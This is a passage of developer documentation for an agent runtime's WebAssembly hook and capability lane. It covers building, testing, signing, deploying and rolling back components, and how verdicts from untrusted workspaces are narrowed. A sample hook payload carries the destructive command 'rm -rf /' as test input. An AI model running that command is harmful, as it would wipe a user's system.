# Writing components for lane W

This is the practical half of [WASM.md](WASM.md): how to write a hook or a capability, how to
run it before a node ever sees it, and how an operator signs, deploys and retires one. The
spec says why the lane exists and what it refuses; this says what to type.

Two facts shape everything below, and they are worth carrying into the first paragraph:

* **A component's authority is its import list.** The world declares exactly one import,
  `log`. There is no clock, no randomness, no filesystem, no socket, and an import the host's
  linker does not define fails instantiation — so a component cannot smuggle authority past a
  manifest that lied about it (WASM.md D5). Everything a component learns arrives in the
  payload it is handed; everything it can do arrives in the reply it gives back.
* **That is why a hook from a repository nobody trusts still runs.** A shell `[[hooks]]` entry
  in a cloned `ouroboros.toml` is declined. A `component =` entry is admitted, because its
  verdict is narrowed on the way back out: it can make a decision stricter and never looser
  (WASM.md D8). The narrowing is the price of admission, and `ouro wasm hook` shows it to you
  before a node does.

Everything here was run against a build of this repository. Where a command prints something,
what is shown is what it printed — trimmed where a listing is long, rewrapped where a line was
too wide for a page, and with the absolute paths of the machine it ran on rewritten as a plain
`/Users/you/code/ouroboros` checkout. Nothing else is edited: no output here was composed.

---

## A hook in fifteen minutes

A hook component answers one event with one verdict. This one asks a human about `bash`.

### 1. Scaffold

```sh
ouro wasm new my-guard --hook
```

```
./my-guard
  a hook component in ouroboros:capability@0.1.0, on ouroboros-guest at
  /Users/you/code/ouroboros/tui/wasm/guest

  cargo build --release --target wasm32-wasip2
  ouro wasm inspect target/wasm32-wasip2/release/my_guard.wasm
```

Four files: `Cargo.toml`, `src/lib.rs`, `README.md` and `.gitignore`. There is no `wit/`
directory, because the bindings are the SDK's — `ouroboros-guest` generates them once and
re-exports them, and `export_hook!` is the whole of the ceremony an author would otherwise
copy. The template is `tui/wasm/guest/template/`, embedded in the `ouro` binary with
`include_str!` and never fetched; `tui/src/wasm_cli.rs` reads those files at run time and
compares them to what it embedded, so the command cannot drift onto a copy of its own.

`--hook` writes the `Hook` shape; without it you get a `Capability`. `--summary <TEXT>` fills
in what `describe` reports (at most 200 characters, and untrusted wherever it is read);
`--into <DIR>` puts the project somewhere other than here. The name is
`Wasm.Artifact.name?/1`'s charset — lower-case alphanumerics, `-` and `_` — because it is the
name the manifest will carry.

#### Where the SDK comes from, and why the command is fussy about it

`ouroboros-guest` is not published, so the generated `Cargo.toml` reaches it by path:

```toml
[dependencies]
ouroboros-guest = { path = "/Users/you/code/ouroboros/tui/wasm/guest" }
```

That path is **executed**. A cargo path dependency's `build.rs` and its proc-macros run during
`cargo build`, so where the value comes from is the same question WASM.md D14 asks about the
helper, and it gets the same answer: it comes from exactly two places, and the working
directory is not among them.

1. `--sdk-path <PATH>` — a person naming one, absolute.
2. The checkout the running `ouro` binary lives in, found by walking the ancestors of a
   canonicalised `current_exe` — `tui/target/{debug,release}/ouro` in a checkout.

Whichever it is, it is vetted before it is written — no symlink at `guest` or the two levels
above it, a regular bounded `Cargo.toml`, and a `[package] name` of exactly `ouroboros-guest`
— and the path written in is **canonical and absolute**, which is why the command prints it:
the line an author reads names the directory that was checked.

An installed `ouro` outside a checkout has neither source, and that case refuses rather than
guesses:

```
$ ouro wasm new elsewhere --hook            # an ouro installed outside any checkout
ouro: no `ouroboros-guest` to depend on. It is not published to crates.io, so a scaffolded
project reaches the SDK by path — and this command will not go looking for one near the
directory it was typed in, because a path dependency's `build.rs` and proc-macros run at
build time and a checkout that supplied one would be choosing what your `cargo build`
executes (docs/WASM.md D14). It comes from `--sdk-path <PATH>`, or from the checkout the
running `ouro` binary lives in. Neither is available here: pass `--sdk-path` naming a
checkout's `tui/wasm/guest`.

$ ouro wasm new elsewhere --hook --sdk-path /Users/you/code/ouroboros/tui/wasm/guest
./elsewhere
  a hook component in ouroboros:capability@0.1.0, on ouroboros-guest at
  /Users/you/code/ouroboros/tui/wasm/guest
```

A directory merely *laid out* like the SDK is not the SDK:

```
$ ouro wasm new impostor --sdk-path /tmp/fake-sdk
ouro: --sdk-path: /tmp/fake-sdk/Cargo.toml declares the package `not-the-sdk`, not
`ouroboros-guest`. A directory laid out like the SDK is not the SDK, and this build would
have run its build script.
```

Give `--sdk-path` an **absolute** path. A relative one is not resolved against the working
directory — that is the whole point of the rule — and is refused with
`could not be inspected`.

### 2. The code you change

The scaffold is a `Hook`, which is the typed seam over the world: a `HookInput` in, a
`Verdict` out, and `&mut self` for the arguments of this call. `src/lib.rs`, trimmed to the
part that is yours:

```rust
#![no_std]

use ouroboros_guest::{
    export_hook, format, log, Describe, Hook, HookInput, String, ToString, Value, Verdict,
};

struct MyGuard { ask_about: String }

impl Hook for MyGuard {
    fn describe(name: &str, version: &str) -> Describe {
        Describe::new(name, version).summary("A hook component.")
    }

    /// The `config = "…"` string beside `component =` in the `ouroboros.toml` that declared
    /// this hook, parsed. It is repository text like any other, so it is read defensively
    /// and never trusted to be there.
    fn init(config: Value) -> Result<Self, String> {
        let ask_about = config
            .get("ask_about")
            .and_then(Value::as_str)
            .unwrap_or("bash")
            .to_string();

        log("info", "my-guard ready");
        Ok(MyGuard { ask_about })
    }

    fn on(&mut self, input: HookInput) -> Result<Verdict, String> {
        // A hook is invoked for what its `matcher` matched and nothing else — but a
        // component that assumed so would be one whose behaviour depends on somebody
        // else's TOML.
        if !input.is("PreToolUse") {
            return Ok(Verdict::Silent);
        }

        let Some(tool) = input.tool_name.as_deref() else {
            return Ok(Verdict::Silent);
        };

        if tool.eq_ignore_ascii_case(&self.ask_about) {
            return Ok(Verdict::ask(format!("my-guard asks about `{tool}`")));
        }

        Ok(Verdict::Silent)
    }
}

export_hook!(MyGuard);
```

As written it denies nothing and asks about one tool, which is the safe shape to start from: a
hook that denies by accident is a repository that cannot run its own tools.

**`#![no_std]` is the claim, not the ceremony**, and it is the one line the SDK cannot own.
`std` on `wasm32-wasip2` imports thirteen `wasi:io`/`wasi:cli` interfaces beside `log`; the
helper's linker defines none of them, so a `std` build does not instantiate at all and
`inspect` reports `world: "unknown"`. Everything else — the allocator, the panic handler, the
canonical ABI's `cabi_realloc`, the bindings, the instance's state cell — is behind
`export_hook!`.

`Verdict::Silent` is the answer to every event this hook has no opinion about, and it is not
`Verdict::Allow`: silence is not consent, and an `allow` from an untrusted workspace is read
as silence anyway. The enum's own documentation in `tui/wasm/guest/src/hook.rs` states which
variants survive which lane, and `test/wasm/sdk_acceptance_test.exs` proves each of those
claims against `hooks.ex` rather than against the SDK's own reply.

The four worked components in `tui/wasm/guest/examples/` are the next thing to read —
`deny-writes` is a real `PreToolUse` rule, `lintcheck` a `[checks]` component, `verdicts` the
fixture that says every verdict there is, and `counter` a capability. The SDK's other two
seams are `Check` (a `[checks]` entry) and `Raw` (a reply stated verbatim), both in
`tui/wasm/guest/src/`.

### 3. Build

```sh
cd my-guard
cargo build --release --target wasm32-wasip2
```

`wasm32-wasip2` emits a component directly from `cargo build` on Rust 1.82 and later — no
`cargo component`, no post-processing. Add the target once with
`rustup target add wasm32-wasip2`.

### 4. Look at it

```sh
ouro wasm inspect target/wasm32-wasip2/release/my_guard.wasm
```

```
target/wasm32-wasip2/release/my_guard.wasm
  world:   ouroboros:capability@0.1.0
  sha256:  df693567c522c27f16b87696d1203f9ce410fc9dcce898e53ed55d2cc7ebff86
  size:    55914 byte(s)
  imports: log
  exports: describe, init, handle-message
  shape (the bound in front of the compiler; reading / ceiling):
    code_bytes                  48007 / 4194304      87×
    functions                     108 / 20000        185×
    …
  verdict: admitted — as a capability and as a hook component
```

`imports: log` is the line a reviewer of your component reads: it is the whole authority
claim. The `shape` block is the structural census the helper took on its way to the compiler,
beside the ceiling each reading was judged against — the same numbers the admission gate used,
so a refusal is never a surprise. `--json` prints the helper's own report, which is also the
document `ouro wasm sign --imports-from -` reads when you want to hand it one explicitly.

`inspect` compiles the component inside a local helper and never instantiates it: nothing you
inspect runs.

### 5. Run it the way the node will

```sh
ouro wasm hook target/wasm32-wasip2/release/my_guard.wasm \
  --event PreToolUse --payload payload.json
```

with `payload.json` holding whatever the event carries — `{"tool_name": "bash", "tool_input":
{"command": "rm -rf /"}}` here. The runtime's own `hook_event_name` is written over whatever
the file says.

```
PreToolUse on the untrusted lane

raw verdict (what the component said):
  decision:      ask
  updatedInput:  (none)
  context:
    my-guard asks about `bash`

kept verdict (what the node would act on, untrusted lane):
  decision:      ask
  updatedInput:  (none)
  context:
    [untrusted workspace hook] my-guard asks about `bash`

dropped: nothing — this verdict reaches the turn whole
```

Two verdicts, always. The second is the only one that ever reaches a turn, and an author who
tests a hook by reading its own output is testing a verdict the runtime may already have
thrown away. `--trusted` shows the other lane — the operator's own hooks, and a workspace they
named — where the context line arrives unlabelled.

The two verdicts differ when the component says something an untrusted workspace may not say.
Against `tui/wasm/guest/examples/verdicts`, which says whatever its config names:

```
$ ouro wasm hook verdicts.wasm --event PreToolUse --config '{"say":"allow"}'
raw verdict (what the component said):
  decision:      allow
kept verdict (what the node would act on, untrusted lane):
  decision:      (none — silence, which is not consent)
dropped:
  allow — an untrusted component may make a decision stricter and never looser; `allow` is
  what resolves an engine `ask`, so it is read as silence
```

```
$ ouro wasm hook verdicts.wasm --event PreToolUse --config '{"say":"updated_input"}'
raw verdict (what the component said):
  updatedInput:  {"content":"rewritten","path":"somewhere/else.txt"}
kept verdict (what the node would act on, untrusted lane):
  updatedInput:  (none)
dropped:
  updatedInput — it replaces the path and the content of a call the engine then allows,
  which is authority rather than annotation
```

Those two rules are implemented twice — once in `hooks.ex`, once in Rust for this display —
and both are pinned to `test/support/wasm_golden/hook_narrowing.json`, read by a test on each
side (WASM.md D14).

### 6. Declare it

Put the component somewhere inside the workspace and name it in `ouroboros.toml`:

```toml
[[hooks]]
event = "PreToolUse"
matcher = "bash|write|edit"
component = "./hooks/my-guard.wasm"
config = '{"ask_about": "bash"}'
```

An entry declares **exactly one** of `command` and `component`; both, or neither, is an error
line and no hook. See [the `ouroboros.toml` keys](#ouroborostoml-the-keys) below.

### 7. Check what a node would admit

```sh
ouro wasm check
```

```
…/ouroboros.toml
  judged as an UNTRUSTED workspace, which is the strict case: a component hook runs from a
  clone, a command hook does not
  helper: …/priv/wasm/ouro-wasm
  [[hooks]] #1  ok       ./hooks/my-guard.wasm
                         matcher: unverified (the node compiles it as PCRE; this client has
                         no regex engine and checked only its 200-byte bound)
  1 component entry verified; 1 matcher NOT verified here — the node compiles those, and
  refuses a pattern that does not
```

`check` judges every entry as an untrusted workspace, which is the strict case, and it
instantiates nothing: admission is a question about a path, a size, a world and the count of
an entry's siblings. It exits non-zero on any refusal, so it belongs in a pre-commit hook —
and it never exits non-zero on an *unverified* matcher, which is why that distinction is
printed rather than guessed at.

### What an untrusted clone actually gets

Said once, with the exact keys, because it is the whole trust argument:

* **It may see** the `tool_input` of every tool call its `matcher` matched — the command a
  `bash` is about to run, the path *and the content* a `write` is about to write. That is
  deliberate: a hook that may deny needs the arguments it is denying.
* **It may not see** any tool's output. At `PostToolUse` and `PostToolUseFailure` an untrusted
  hook is handed `tool_response` as `{"is_error": …, "bytes": …}` and nothing else. A trusted
  hook gets the response itself.
* **It is not dispatched at all** on `Notification`, `FileChanged` and `SessionEnd`: the turn
  loop discards what all three return, so running one would buy a clone a read of this
  session's tool names and changed paths in exchange for a verdict nothing consumes.
* **Of what it says back**, `deny`, `ask` and `additionalContext` stand; `allow` is read as
  silence and `updatedInput` is dropped. Every *line* of its context is prefixed
  `[untrusted workspace hook] ` — per line, because a label on the first line of ten leaves
  nine reading as if this runtime wrote them.
* **It is counted.** At most eight components across `[[hooks]]` and `[checks]` together from
  an untrusted workspace; the rest are declined. Separately, at most sixteen distinct
  untrusted hook shas per helper lifetime.

---

## A capability in fifteen minutes

A capability is a mesh agent: JSON in, JSON out, state held by the instance between messages.
It is deployed by an operator under a signature, and it survives a reboot.

### 1. Scaffold, and the `Capability` trait

```sh
ouro wasm new my-capability --summary 'Counts things and says how many.'
```

Without `--hook` the same command writes the `Capability` shape instead — the same four files,
the same `ouroboros-guest` path dependency, the same rule about where that path may come from
(above). `--summary` is what the generated `describe` reports about the component:

```rust
fn describe() -> Describe {
    Describe::new("my-capability", env!("CARGO_PKG_VERSION"))
        .summary("Counts things and says how many.")
        .input_schema(json!({ "type": "object" }))
```

The typed seam, from `tui/wasm/guest/src/capability.rs`, is three functions:

```rust
pub trait Capability: Sized {
    fn describe() -> Describe;
    fn init(config: Value) -> Result<Self, String>;
    fn handle(&mut self, body: Value) -> Result<Value, String>;
}
```

`Self` is the instance. It is created once by `init` and lives until the host drops the
instance, so `handle` gets `&mut self` and there is no static to declare. **Never trap:** a
body that is not JSON, a config that is not JSON, a message before `init` — each is
`Err(String)`, which the host records as `guest_error` against an instance that stays live. A
trap is a different fact about a component, and it costs the instance.

`tui/wasm/guest/examples/counter` is the worked one:

```rust
fn handle(&mut self, body: Value) -> Result<Value, String> {
    let add = match body.get("add") {
        None => self.step,
        Some(value) => value.as_u64()
            .ok_or_else(|| format!("`add` must be a non-negative integer, got {value}"))?,
    };

    self.count = self.count.saturating_add(add);
    self.messages += 1;
    Ok(json!({ "count": self.count, "messages": self.messages }))
}
```

### 2. `Describe`, which is contract C1

```rust
fn describe() -> Describe {
    Describe::new("counter", env!("CARGO_PKG_VERSION"))
        .summary("Counts. Send {\"add\": n} to add n, or {} to add the configured step.")
        .input_schema(json!({ "type": "object", "properties": { /* … */ } }))
        .example(json!({ "add": 2 }), json!({ "count": 2, "messages": 1 }))
}
```

`world` is filled in by the crate and never by you. Everything else is **untrusted text you
wrote about yourself**: nothing above verifies a word of it, it is read once at deploy and
stored, and wherever it reaches a model it is labelled `[untrusted, authored by the
component]`. Write it to inform a reader; do not write it as if it were a permission. The
document's shape is under [the `describe` document](#the-describe-document-c1).

### 3. Run it

```sh
ouro wasm run counter.wasm --config '{"step":5}' --message '{}' --message '{"add":2}' --describe
```

```
world ouroboros:capability@0.1.0, sha256 42a340c6526d6014d7d1c88c8319f97e3e2a0c854565718e00edbf47dff0761d
bounds: fuel 100000000, memory 67108864 byte(s), deadline 5000 ms

describe: {"examples":[{"message":{"add":2},"reply":{"count":2,"messages":1}}],…,"name":"counter",…}

message 1: {}
  reply: {"count":5,"messages":1}
  fuel 5103 used, 0 ms wall

message 2: {"add":2}
  reply: {"count":7,"messages":2}
  fuel 6441 used, 0 ms wall
```

Every message goes to the **same** instance — `"messages":2` is the evidence — because state
in this world is instance-held and a fresh instance per message would exercise a different
component from the one that gets deployed. `--messages <file>` reads JSON lines. The bounds
default to the node's own `capability_limits`; `--fuel`, `--memory-bytes` and `--deadline-ms`
raise or lower them and are clamped **down** to the helper's maxima, never up, with the clamp
printed.

### 4. The operator's half

Everything from here needs a node. The transcripts below are from a dev daemon on this Mac,
end to end.

#### Mint a signing identity

```sh
ouro wasm keygen --out /tmp/ouroboros-demo/signer.key --id demo-key
```

```
wrote /tmp/ouroboros-demo/signer.key (mode 0600)

On the signer node — and nowhere else — the private half:
  OUROBOROS_SIGNER_KEY_PATH=/tmp/ouroboros-demo/signer.key
  OUROBOROS_SIGNER_ID=demo-key

On every core node that must accept what it signs — the public half:
  OUROBOROS_UPGRADE_TRUSTED_SIGNERS=demo-key:FS4r0JHfdqbEVGgPdz0TTzKU8qH1GfJJQsMo/sh3EH8=

The seed never leaves the signer. A core node needs only the line above it; anyone holding
the file can sign as this identity.
```

It contacts no runtime, refuses to overwrite an existing file, and its derived public half is
pinned against the RFC 8032 test vector — a keygen that derived a different public key would
print a trust line that verifies nothing and no local round trip would catch it. A relative
`--out` is made absolute before anything is written and canonical before it is printed, so the
`OUROBOROS_SIGNER_KEY_PATH` line above is always one a `:signer` node will boot with.

#### Sign

```sh
ouro wasm sign counter.wasm --name counter --author ops@example \
  --eval eval.json --start-config '{}' --out counter.ouro-wasm
```

```
signed counter as demo-key (epoch 2)
  component: 42a340c6526d6014d7d1c88c8319f97e3e2a0c854565718e00edbf47dff0761d (54825 bytes)
  world: ouroboros:capability@0.1.0
  imports: log
  starts as: wasm/counter
  artifact: 01a06460-d953-71ab-9d18-51e165b98623
wrote counter.ouro-wasm
deploy it with: ouro wasm deploy counter.ouro-wasm
```

Four things about that command:

* **The imports are the client's to declare, and this end reads them.** The node does not read
  the component to find out: those are unsigned bytes from a socket, and handing them to the
  one process whose job is running other people's code is what this lane exists to avoid
  (WASM.md D15). So `sign` starts *your* helper, reads the import list, and binds it to the sha
  of the bytes in hand — before it opens a socket or uploads anything, so a component your own
  helper refuses never reaches a gateway. A declared list that does not match what the
  component imports is refused again at stage by the node's cross-check.

  `--imports-from <PATH>` (or repeated `--import <NAME>`) is the explicit form of the same
  thing, for a machine with no local helper — pair it with `--no-local-helper`, which makes
  the absence a rule rather than a fallback:

  ```sh
  ouro wasm inspect counter.wasm --json > imports.json     # on a machine that has a helper
  ouro wasm sign counter.wasm --name counter --author ops@example \
    --eval eval.json --imports-from imports.json --no-local-helper
  ```

  `--dry-run` prints the parameters this command would send, having read the imports exactly
  as the real run does, and opens no socket at all — which is how to see what your helper says
  about a component before a node is asked to sign it.
* **This end never signs anything.** The bytes are uploaded in frames and handed to the node's
  signing service, which applies the whole policy on the host that holds the key and journals
  the decision. The key lives on a `:signer`-role node; that node signs, and the driving node
  never sees it.
* **The epoch is not yours to name.** It is allocated over the connected nodes that actually
  hold a rollout register — the only nodes that can ever call an epoch stale — so a `:signer`
  or `:builder` in the cluster is not asked and cannot block the allocation.
* **`--eval` is required by default.** Lane W has no build peer behind it, so the signed
  evaluation spec *is* the test story (WASM.md D12). A minimal one:

  ```json
  {
    "probes": [
      { "input": { "add": 2 },
        "expect": { "kind": "state_matches", "key": "last_answer",
                    "value": { "count": 2, "messages": 1 } } }
    ],
    "budget_ms": 10000
  }
  ```

  The expectation kinds are `any_reply`, `contains` (`substring`), `equals` (`value`) and
  `state_matches` (`key`, `value`). `last_answer` is the wrapper agent's state key holding the
  component's last reply, decoded — so `value` is the JSON object, not a string of it.

`--start-config` is what makes the capability *durable*: it names the config the wrapper agent
is started with, which is what makes it run continuously and come back after a reboot. Its
**id** is derived from `--name` and is deliberately not a flag.

The node answers with the bundle's prefix; the client appends the bytes it already holds and
writes the `.ouro-wasm` file.

One line of that output is worth reading when a capability is large. Signing compiles the
component on the signing node and the bundle carries that artifact beside the source, so the
artifact is the one part of the file you did not supply — and past three quarters of
`OUROBOROS_GATEWAY_MAX_FRAME` it does not fit the reply `wasm.sign` answers with. `sign` then
fetches it over `wasm.download` in frames the node sizes from that same setting — 48 384 bytes
of artifact at a 64 KiB frame, 512 KiB at the default mebibyte — and says so:
`artifact form: fetched in 6 frame(s) — too large for one reply`, against `artifact form:
carried in the signature's own reply` for everything smaller. Nothing about the bundle differs
between the two — it is byte for byte the same file either way, and `deploy` cannot tell them
apart. What you may notice is a few extra seconds and, if the transfer is interrupted, a
refusal naming the digest that did not match: the node released the slot with the last chunk it
sent, so the fix is to run `sign` again rather than to retry a download. A node with nowhere to
stage the artifact signs the source form instead and says `artifact_not_staged`, which deploys
and runs exactly as it always did (docs/WASM.md D28). There are three ways to be in that state
and all three are an operator's to recognise: no data directory; a frame too small to carry a
four-kibibyte chunk, which is roughly `OUROBOROS_GATEWAY_MAX_FRAME` under 6.5 KiB; or all eight
of the node's download slots already held by signatures nobody fetched, which clears itself ten
minutes after the last of them was read.

#### Deploy

```sh
ouro wasm deploy counter.ouro-wasm
```

```
counter epoch 2 — live
  component: 42a340c6526d6014d7d1c88c8319f97e3e2a0c854565718e00edbf47dff0761d
  reached: evaluate
  wrapper: wasm/counter started on nonode@nohost
  nonode@nohost:
    stage:    ok
    probe:    ok
    eval:     passed (1/1)
  spec: 1 probe(s), all required, 10000 ms budget
```

The bundle is verified against the **target's own** trust policy before the store, the helper
or the rollout register hears about it. Then it is the same rollout the BEAM lane has: stage,
probe, evaluate, capture the `describe`, settle. A failure is a state rather than an error —
this is the same command reporting an eval that did not pass:

```
counter epoch 1 — rolled back: every node proved the capability is not running there
  reached: evaluate
  nonode@nohost:
    stage:    ok
    probe:    ok
    eval:     failed — [%{index: 0, reason: {:state_mismatch, :last_answer, …}, ms: 1}] (0/1)
    recovery: not_needed
```

`--nodes a,b` deploys to more machines than the one you are driving from. Doing so costs
reboot survival on the others, and the answer says so rather than refusing.

#### List, and retire

```sh
ouro wasm ls
```

```
nonode@nohost — 2 rollout(s), 1 component(s)

rollouts:
  STATE        NAME                 EPOCH  COMPONENT         NODES
  rolled_back  counter                  1  42a340c6526d6014  nonode@nohost
  live         counter                  2  42a340c6526d6014  nonode@nohost

components:
  SHA256            BYTES
  42a340c6526d6014  54825
```

```sh
ouro wasm rollback counter
```

```
counter — rolled back
  wrapper: wasm/counter
  nonode@nohost: stopped
  the component bytes stay in the store: redeploying needs a new epoch and a new signature,
  not a new build
```

Rollback is honest and total: no code was loaded, so retiring one is stopping the wrapper
agents and marking the entry. It marks `:rolled_back` only where every node proved **absence**;
a node where something is still answering under that id quarantines instead, and the per-node
evidence says which node and why.

### 5. What a model sees

A live capability is reachable from the model loop through the native `capability` tool, and
through nothing else — it is not a mesh client.

* `capability list` answers with the register's own facts about every `:live` lane-W rollout
  **that names this node** — name, epoch, component sha256, whether an agent is running —
  beside each component's own `describe`, read at deploy, bounded, and rendered under
  `[untrusted, authored by the component]`. At most 50 are listed, and the heading says when
  it cut; the cap is on the listing only, and a capability past it is still callable by name.
* `capability call` takes `{name, message}`. The body is refused above 64 KiB before anything
  is sent; the reply is bounded at 64 KiB with a truncation marker and **every line** of it
  carries the same label.
* The permission rule is `Capability(<name>)`, or `Capability(*)` for any. With no rule
  written the engine's own posture applies: **ask**, once per capability, and the operator's
  answer is what persists. The name a rule matches is one this node resolved against its live
  rollouts before the engine was asked, which is what makes an *allow* on it honest.
  `Tool(capability)` is deny-and-ask only: one call reaches one component, so an allow on the
  tool name would be an allow on every component this node will ever deploy.
* The tool call is ledgered like any other, carrying the capability's name and the component's
  sha256. The mesh message itself is not individually ledgered (WASM.md D11), so that entry is
  the whole written record that a model reached a component.
* **It is expensive.** One `ouro-wasm` per node serves every capability and every workspace
  hook, one request at a time, so a call holds the node's containment lane for as long as the
  target's deadline plus the pool's call margin. That is stated in the tool's own description
  so a model can weigh it against a cheaper tool.

### 6. `agents.message`, for a script

The operator's half of the same reach is the gateway verb `agents.message`, scope `:operate`:

```json
{"method": "agents.message", "params": {"to": "wasm/counter", "body": {"add": 40}}}
```

```json
{"result": {"from": "gateway", "to": "wasm/counter",
            "reply": {"count": 40, "messages": 1},
            "truncated": false, "untrusted": true}}
```

It reaches *any* mesh agent, because the mesh already resolves an agent anywhere in the
cluster and a weaker second answer would not change that. `untrusted: true` is the label in
structured form; `truncated` says whether the reply was cut at the 64 KiB bound.
`agents.state` is the `:read` sibling and labels and bounds the same two fields for a `wasm/`
agent, because it returns them too.

---

## The contracts

### The world

`tui/wasm/wit/capability.wit`, in full:

```wit
package ouroboros:capability@0.1.0;

world capability {
  /// JSON metadata: name, version, declared eval hints. Pure.
  export describe: func() -> string;
  /// Called once per instance with host-supplied JSON config.
  export init: func(config: string) -> result<_, string>;
  /// One mesh message in, one reply out. JSON both ways. State is instance-held.
  export handle-message: func(body: string) -> result<string, string>;
  /// Log line into the daemon's logger. The only import in v1.
  import log: func(level: string, message: string);
}
```

There is one world, and a hook is a strict subset of a capability: the hook payload goes in
through `handle-message`, the verdict comes back as its reply, `init` receives the hook's
declared `config` (or `"{}"`), and `describe` is unused. A scaffolded project carries no copy
of this file — `ouroboros-guest` generates the bindings once and re-exports them, which is one
fewer thing to drift. `tui/wasm/src/world.rs` hard-codes the same shape, because the helper
must be able to refuse bytes without a WIT parser on the loading path.

Growth of a world's import set is a signing-policy event, not a convenience (WASM.md §12).

### The hook payload, per event

The authority is `test/support/wasm_golden/hook_payloads.json`. Every payload in it was read
off the wire rather than written, and `test/provider/native/hooks_payload_golden_test.exs`
drives each case back through the public seam a turn uses, so the file cannot quietly stop
describing `lib/ouroboros/provider/native/hooks.ex`.

Every payload is the same **base** — built by the caller, `hook_base/1` in
`lib/ouroboros/provider/native/loop.ex` for a turn and in
`lib/ouroboros/provider/native/session.ex` for the three lifecycle events —

```json
{"session_id": …, "provider_session_id": …, "turn_id": …, "cwd": …, "workspace_trusted": …}
```

— plus `hook_event_name` and what the event adds:

| event | lane | over the base, besides `hook_event_name` |
|---|---|---|
| `SessionStart` | trusted | `source` |
| `SessionEnd` | trusted | `reason` |
| `UserPromptSubmit` | trusted | — |
| `PreToolUse` | trusted | `tool_input`, `tool_name` |
| `PostToolUse` | trusted | `tool_input`, `tool_name`, `tool_response` |
| `PostToolUse` | untrusted | `tool_input`, `tool_name`, `tool_response` |
| `PostToolUseFailure` | trusted | `tool_input`, `tool_name`, `tool_response` |
| `PostToolUseFailure` | untrusted | `tool_input`, `tool_name`, `tool_response` |
| `Stop` | trusted | — |
| `PreCompact` | trusted | `custom_instructions`, `messages`, `trigger` |
| `Notification` | trusted | `tool_name` |
| `FileChanged` | trusted | `paths` |
| `check` | trusted | `event`, `name` (and no base at all) |

`turn_id` is `null` for `SessionStart`, `SessionEnd` and `PreCompact`, because none of them
happens inside a turn. `source` is `"startup"` or `"resume"`; `trigger` is `"manual"` or
`"automatic"`. `Notification`, `FileChanged` and `SessionEnd` are not dispatched to an
untrusted hook at all, which is why the table has no untrusted row for them.

Two rows in full, quoted from the fixture. A `PreToolUse`:

```json
{
  "cwd": "/w",
  "hook_event_name": "PreToolUse",
  "provider_session_id": "prov-01HQ",
  "session_id": "sess-01HQ",
  "tool_input": { "content": "x", "path": "src/a.ex" },
  "tool_name": "write",
  "turn_id": "turn-3",
  "workspace_trusted": true
}
```

and the same `PostToolUse` an **untrusted** hook is handed — where a trusted one would have
`"tool_response": {"is_error": false, "output": "defmodule A do\nend\n"}`:

```json
{
  "cwd": "/w",
  "hook_event_name": "PostToolUse",
  "provider_session_id": "prov-01HQ",
  "session_id": "sess-01HQ",
  "tool_input": { "path": "src/a.ex" },
  "tool_name": "read",
  "tool_response": { "bytes": 19, "is_error": false },
  "turn_id": "turn-3",
  "workspace_trusted": false
}
```

`workspace_trusted` tells a hook shipped *by* an untrusted workspace that its verdict will be
narrowed. It is a fact, not an instruction.

### The reply a hook may make

One JSON object, or the empty string. The shape is Claude Code's, which Codex, Gemini and
Factory also speak:

```json
{"hookSpecificOutput": {
   "permissionDecision": "allow" | "deny" | "ask",
   "permissionDecisionReason": "what a human is told",
   "additionalContext": "text appended to the tool result or the next prompt",
   "updatedInput": {"…": "replacement tool_input"}
}}
```

The older top-level `{"decision": "block", "reason": …}` shape is accepted too. Anything else
— a reply that is not JSON, an object with none of these keys — is **nothing happened**.

* **The empty reply is silence, and silence is not consent.** It is distinct from `allow` at
  the seam precisely so that an installed hook is never an approval bypass. In the SDK it is
  `Verdict::Silent`.
* `deny` is final: the first one stops the chain and no later hook runs.
* `updatedInput` is re-evaluated by the permission engine before it is used, so a rewrite
  cannot launder a denied command — even from a trusted workspace.
* A hook can never allow what a rule denied, because on a denial no hook is invoked at all.
* From an untrusted workspace: `allow` is read as silence, `updatedInput` is dropped, and
  every line of `additionalContext` is labelled and then clipped to 8 KiB.

A component hook that fails to run — its own `err`, a trap, a refusal, a helper that was never
built, a broken pipe, a deadline, a reply past the output cap — is **ignored loudly**, exactly
as a shell hook that crashed is. It is not consent and it is not a denial.

### The `[checks]` contract

A check has no verdict, only text. Its payload carries nothing about the session:

```json
{"event": "check", "name": "vet"}
```

`name` is the key it was declared under. An **empty reply is a pass**; any other reply is the
failure text, tail-clipped to the last forty lines. A guest `Err`, a trap or any other refusal
is a failure line naming the reason — a check that could not run is not a check that passed.

A failure is injected into the turn as a **user message**, which is a stronger position than a
hook's `additionalContext` gets; so an untrusted workspace's failure is labelled per line, the
check's own name and path included, both clipped to 200 bytes. A **command** check still needs
a trusted workspace: there is no difference in kind between a repository-supplied command line
and a `[[hooks]]` command.

`tui/wasm/guest/src/hook.rs`'s `Check` trait and `tui/wasm/guest/examples/lintcheck` are the
typed version.

### The `describe` document (C1)

```json
{
  "name": "<lower-case, starting alphanumeric, then letters, digits, . _ -, ≤ 64 bytes>",
  "version": "<semver string>",
  "world": "ouroboros:capability@0.1.0",
  "summary": "<= 200 chars of plain text",
  "input_schema": { "JSON Schema for the message body; absent means any JSON" },
  "examples": [ { "message": {}, "reply": {} } ]
}
```

`summary`, `input_schema` and `examples` are optional; `examples` holds at most four. Unknown
keys are ignored. The whole document is refused above 4 KiB *before* it is decoded, and every
string reached by walking it — `name`, `summary`, and every string inside `examples` and
`input_schema` — is refused if it carries a character in Unicode category **Cc**, **Cf**,
**Zl** or **Zp**. Those are the characters that let a component's prose stop looking like a
component's prose: a newline puts its next sentence on a line of its own, and U+202E reverses
what a human reviews relative to what a model reads.

It is read **at deploy**, as a rollout gate, on a throwaway instance under its own bounds, and
stored on the registry entry — which is where every reader gets it. It used to be read on the
message path, and a component whose `describe` took six seconds while answering messages
instantly failed the rollout probe's five-second budget and was rolled back (WASM.md D17). A
capability's liveness must not depend on how fast it can describe itself.

### `ouroboros.toml`, the keys

Read only from the workspace root, and — for **command** entries — only when
`config :ouroboros, :trusted_workspaces` names the canonical root. Component entries are read
either way.

```toml
[[hooks]]
event = "PreToolUse"       # required
matcher = "bash|write"     # optional; a PCRE over the tool name, anchored; absent = every tool
command = "./scripts/vet.sh"   # exactly one of command …
component = "./hooks/vet.wasm" # … or component
config = '{"strict": true}'    # component only: the string handed to init, verbatim
timeout_ms = 10000             # optional

[checks]
typecheck = "mix compile --warnings-as-errors"
lint = { component = "./hooks/lint.wasm", config = '{"strict":true}' }
```

| key | applies to | rule |
|---|---|---|
